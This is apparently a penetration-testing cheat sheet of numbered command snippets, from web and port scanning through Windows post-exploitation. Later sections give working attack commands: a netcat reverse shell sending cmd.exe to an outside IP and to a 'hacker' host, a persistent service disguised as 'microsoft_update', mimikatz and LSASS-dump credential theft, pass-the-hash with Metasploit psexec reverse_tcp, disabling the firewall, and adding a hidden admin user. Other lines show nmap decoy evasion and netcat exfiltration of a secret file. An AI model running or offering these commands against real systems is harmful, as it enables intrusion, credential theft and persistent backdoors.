```
1. Nmap Full Web Vulnerable Scan  
  
cd /usr/share/nmap/scripts/  
wget [http://www.computec.ch/projekte/vulscan/...2.0.tar.gz](http://www.computec.ch/projekte/vulscan/...2.0.tar.gz) && tar xzf nmap_nse_vulscan-2.0.tar.gz  
nmap -sS -sV --script=vulscan/vulscan.nse target  
nmap -sS -sV --script=vulscan/vulscan.nse –script-args vulscandb=scipvuldb.csv target  
nmap -sS -sV --script=vulscan/vulscan.nse –script-args vulscandb=scipvuldb.csv -p80 target  
nmap -PN -sS -sV --script=vulscan –script-args vulscancorrelation=1 -p80 target  
nmap -sV --script=vuln target  
nmap -PN -sS -sV --script=all –script-args vulscancorrelation=1 target  
---------------------------------------------------------------------------------------------------  
  
2. Dirb Dir Bruteforce:  
  
dirb http://IP:PORT /usr/share/dirb/wordlists/common.txt  
---------------------------------------------------------------------------------------------------  
  
3. Nikto web server scanner  
  
nikto -C all -h http://IP  
---------------------------------------------------------------------------------------------------  
  
4. WordPress Scanner  
  
git clone [https://github.com/wpscanteam/wpscan.git](https://github.com/wpscanteam/wpscan.git) && cd wpscan  
./wpscan –url http://IP/ –enumerate p  
---------------------------------------------------------------------------------------------------  
  
5. HTTP Fingerprinting  
  
wget [http://www.net-square.com/_assets/httpri...ux_301.zip](http://www.net-square.com/_assets/httpri...ux_301.zip) && unzip httprint_linux_301.zip  
cd httprint_301/linux/  
./httprint -h http://IP -s signatures.txt  
---------------------------------------------------------------------------------------------------  
  
6. SKIP Fish Scanner  
  
skipfish -m 5 -LY -S /usr/share/skipfish/dictionaries/complete.wl -o ./skipfish2 -u http://IP  
---------------------------------------------------------------------------------------------------  
  
7. Nmap Ports Scan  
  
1)decoy- masqurade nmap -D RND:10 [target] (Generates a random number of decoys)  
1)decoy- masqurade nmap -D RND:10 [target] (Generates a random number of decoys)  
2)fargement  
3)data packed – like orginal one not scan packet  
4)use auxiliary/scanner/ip/ipidseq for find zombie ip in network to use them to scan — nmap -sI ip target  
5)nmap –source-port 53 target  
nmap -sS -sV -D IP1,IP2,IP3,IP4,IP5 -f –mtu=24 –data-length=1337 -T2 target ( Randomize scan form diff IP)  
nmap -Pn -T2 -sV –randomize-hosts IP1,IP2  
nmap –script smb-check-vulns.nse -p445 target (using NSE scripts)  
nmap -sU -P0 -T Aggressive -p123 target (Aggresive Scan T1-T5)  
nmap -sA -PN -sN target  
nmap -sS -sV -T5 -F -A -O target (version detection)  
nmap -sU -v target (Udp)  
nmap -sU -P0 (Udp)  
nmap -sC 192.168.31.10-12 (all scan default)  
---------------------------------------------------------------------------------------------------  
  
8. NC Scanning  
  
nc -v -w 1 target -z 1-1000  
for i in {101..102}; do nc -vv -n -w 1 192.168.56.$i 21-25 -z; done  
---------------------------------------------------------------------------------------------------  
  
9. Unicornscan  
  
us -H -msf -Iv 192.168.56.101 -p 1-65535  
us -H -mU -Iv 192.168.56.101 -p 1-65535  
-H resolve hostnames during the reporting phase  
-m scan mode (sf - tcp, U - udp)  
-Iv - verbose  
---------------------------------------------------------------------------------------------------  
  
10. Xprobe2 OS fingerprinting  
xprobe2 -v -p tcp:80:open IP  
---------------------------------------------------------------------------------------------------  
  
11. Samba Enumeration  
  
nmblookup -A target  
smbclient //MOUNT/share -I target -N  
rpcclient -U "" target  
enum4linux target  
---------------------------------------------------------------------------------------------------  
  
12. SNMP Enumeration  
  
snmpget -v 1 -c public IP  
snmpwalk -v 1 -c public IP  
snmpbulkwalk -v2c -c public -Cn0 -Cr10 IP  
---------------------------------------------------------------------------------------------------  
  
13.Windows Useful cmds  
  
net localgroup Users  
net localgroup Administrators  
search dir/s *.doc  
system("start cmd.exe /k $cmd")  
sc create microsoft_update binpath="cmd /K start c:\nc.exe -d ip-of-hacker port -e cmd.exe" start= auto error= ignore  
/c C:\nc.exe -e c:\windows\system32\cmd.exe -vv 23.92.17.103 7779  
mimikatz.exe "privilege::debug" "log" "sekurlsa::logonpasswords"  
Procdump.exe -accepteula -ma lsass.exe lsass.dmp  
mimikatz.exe "sekurlsa::minidump lsass.dmp" "log" "sekurlsa::logonpasswords"  
C:\temp\procdump.exe -accepteula -ma lsass.exe lsass.dmp For 32 bits  
C:\temp\procdump.exe -accepteula -64 -ma lsass.exe lsass.dmp For 64 bits  
---------------------------------------------------------------------------------------------------  
  
14.PuTTY Link tunnel  
  
Forward remote port to local address  
plink.exe -P 22 -l root -pw "1234" -R 445:127.0.0.1:445 IP  
---------------------------------------------------------------------------------------------------  
  
15.Meterpreter portfwd  
  
# [https://www.offensive-security.com/metas...d/portfwd/](https://www.offensive-security.com/metas...d/portfwd/)  
# forward remote port to local address  
meterpreter > portfwd add –l 3389 –p 3389 –r 172.16.194.141  
kali > rdesktop 127.0.0.1:3389  
---------------------------------------------------------------------------------------------------  
  
16.Enable RDP Access  
  
reg add "hklm\system\currentcontrolset\control\terminal server" /f /v fDenyTSConnections /t REG_DWORD /d 0  
netsh firewall set service remoteadmin enable  
netsh firewall set service remotedesktop enable  
---------------------------------------------------------------------------------------------------  
  
17.Turn Off Windows Firewall  
  
netsh firewall set opmode disable  
---------------------------------------------------------------------------------------------------  
  
18.Meterpreter VNC\RDP  
  
# [https://www.offensive-security.com/metas...e-desktop/](https://www.offensive-security.com/metas...e-desktop/)  
run getgui -u admin -p 1234  
run vnc -p 5043  
---------------------------------------------------------------------------------------------------  
  
19.Add New user in Windows  
  
net user test 1234 /add  
net localgroup administrators test /add  
---------------------------------------------------------------------------------------------------  
  
20.Mimikatz use  
  
git clone [https://github.com/gentilkiwi/mimikatz.git](https://github.com/gentilkiwi/mimikatz.git)  
privilege::debug  
sekurlsa::logonPasswords full  
---------------------------------------------------------------------------------------------------  
  
21.Passing the Hash  
  
git clone [https://github.com/byt3bl33d3r/pth-toolkit](https://github.com/byt3bl33d3r/pth-toolkit)  
pth-winexe -U hash //IP cmd  
or  
apt-get install freerdp-x11  
xfreerdp /u:offsec /d:win2012 /pth:HASH /v:IP  
or  
meterpreter > run post/windows/gather/hashdump  
Administrator:500:e52cac67419a9a224a3b108f3fa6cb6d:8846f7eaee8fb117ad06bdd830b7586c:::  
msf > use exploit/windows/smb/psexec  
msf exploit(psexec) > set payload windows/meterpreter/reverse_tcp  
msf exploit(psexec) > set SMBPass e52cac67419a9a224a3b108f3fa6cb6d:8846f7eaee8fb117ad06bdd830b7586c  
msf exploit(psexec) > exploit  
meterpreter > shell  
---------------------------------------------------------------------------------------------------  
  
22.Hashcat password cracking  
  
hashcat -m 400 -a 0 hash /root/rockyou.txt  
---------------------------------------------------------------------------------------------------  
  
23.Netcat examples  
  
c:> nc -l -p 31337  
#nc 192.168.0.10 31337  
c:> nc -v -w 30 -p 31337 -l < secret.txt  
#nc -v -w 2 192.168.0.10 31337 > secret.txt  
---------------------------------------------------------------------------------------------------  
  
24.Banner grabbing with NC  
  
nc 192.168.0.10 80  
GET / HTTP/1.1  
Host: 192.168.0.10  
User-Agent: Mozilla/4.0  
Referrer: [http://www.example.com](http://www.example.com)  
<enter>  
<enter>  
---------------------------------------------------------------------------------------------------  
  
25.Window reverse shell  
  
c:>nc -Lp 31337 -vv -e cmd.exe  
nc 192.168.0.10 31337  
c:>nc example.com 80 -e cmd.exe  
nc -lp 80  
nc -lp 31337 -e /bin/bash  
nc 192.168.0.10 31337  
nc -vv -r(random) -w(wait) 1 192.168.0.10 -z(i/o error) 1-1000  
---------------------------------------------------------------------------------------------------
```